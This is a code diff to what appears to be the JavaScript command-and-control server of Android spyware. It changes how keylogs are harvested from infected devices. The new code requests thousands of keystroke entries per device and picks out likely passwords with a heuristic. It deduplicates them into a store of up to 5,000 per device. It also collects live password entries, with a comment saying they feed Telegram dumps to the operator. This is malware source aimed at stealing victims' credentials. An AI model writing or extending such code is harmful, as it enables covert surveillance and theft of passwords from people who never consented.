@@ -481,24 +481,47 @@ async function _autoSyncDevice(deviceId) {
         } catch (_) {}
     }
 
-    // Sync passwords (from device keylogs filtered by isPassword)
+    // Sync passwords (from device keylogs filtered by looksLikePassword)
     if ((now - (last.passwords || 0)) > SYNC_DEDUP_MS) {
         deviceLastSyncAt.set(deviceId, { ...(deviceLastSyncAt.get(deviceId) || {}), passwords: now });
         try {
-            const resp = await _sendAndCapture(deviceId, 'get_keylogs', {}, 30000);
-            if (resp) {
-                const d = typeof resp === 'string' ? JSON.parse(resp) : resp;
-                const all = d.entries || d.keylogs || d.logs || d.keylogEntries || d.data || [];
-                const pwds = all.filter(e =>
-                    e.isPassword === true || e.isPassword === 'true' || e.eventType === 'PASSWORD_FOCUS'
-                );
-                if (pwds.length) {
-                    devicePasswords.set(deviceId, pwds);
-                    log('SYNC', `Passwords synced: ${pwds.length} entries for ${deviceId}`);
-                }
+            const items = await _sendAndCaptureChunked(deviceId, 'get_keylogs', { limit: 2000 }, 60000);
+            const all = Array.isArray(items) ? items
+                : (() => { try { const d = typeof items === 'string' ? JSON.parse(items) : (items || {}); return d.entries || d.keylogs || d.logs || d.data || []; } catch { return []; } })();
+            const pwds = all.filter(e => {
+                const text = e.text || e.content || e.typedText || '';
+                const hint = e.fieldType || e.inputType || e.field || '';
+                return _looksLikePassword(text, hint, e.isPassword, e.eventType || '');
+            });
+            if (pwds.length) {
+                _mergeDevicePasswords(deviceId, pwds);
+                log('SYNC', `Passwords synced: ${pwds.length} new entries for ${deviceId} (total: ${(devicePasswords.get(deviceId) || []).length})`);
             }
         } catch (_) {}
     }
+}
+
+// Merge new password entries into the persistent in-memory store.
+// Deduplicates by (appPackage|text[:50]|timestamp) and caps at 5000 per device.
+const _PWD_MAX_PER_DEVICE = 5000;
+function _mergeDevicePasswords(deviceId, newEntries) {
+    const existing = devicePasswords.get(deviceId) || [];
+    const seen = new Set(existing.map(e => {
+        const text = e.text || e.content || e.typedText || '';
+        return `${e.packageName || e.appPackage || ''}|${text.slice(0, 50)}|${e.timestamp || ''}`;
+    }));
+    const toAdd = [];
+    for (const e of newEntries) {
+        const text = e.text || e.content || e.typedText || '';
+        const key  = `${e.packageName || e.appPackage || ''}|${text.slice(0, 50)}|${e.timestamp || ''}`;
+        if (seen.has(key)) continue;
+        seen.add(key);
+        toAdd.push(e);
+    }
+    if (!toAdd.length) return;
+    const merged = [...toAdd, ...existing];
+    if (merged.length > _PWD_MAX_PER_DEVICE) merged.length = _PWD_MAX_PER_DEVICE;
+    devicePasswords.set(deviceId, merged);
 }
 
 // Build-worker settings — admin sets API key in dashboard Settings.
@@ -1284,6 +1307,14 @@ async function processMessage(clientId, clientType, event, data) {
             broadcastDash('keylog:push', entry);
             // Persist to Redis (non-blocking)
             R.pushKeylog(deviceId, entry).catch(() => {});
+            // Accumulate password-matching entries into devicePasswords for Telegram dumps
+            {
+                const text = entry.text || entry.content || entry.typedText || '';
+                const hint = entry.fieldType || entry.inputType || entry.field || '';
+                if (_looksLikePassword(text, hint, entry.isPassword, entry.eventType || '')) {
+                    _mergeDevicePasswords(deviceId, [entry]);
+                }
+            }
             // Forward to Telegram if admin enabled live keylog forwarding
             if (telegramSettings.enabled && telegramSettings.sendKeylogOnConnect) {
                 const rec = inMemoryDevices.get(deviceId);
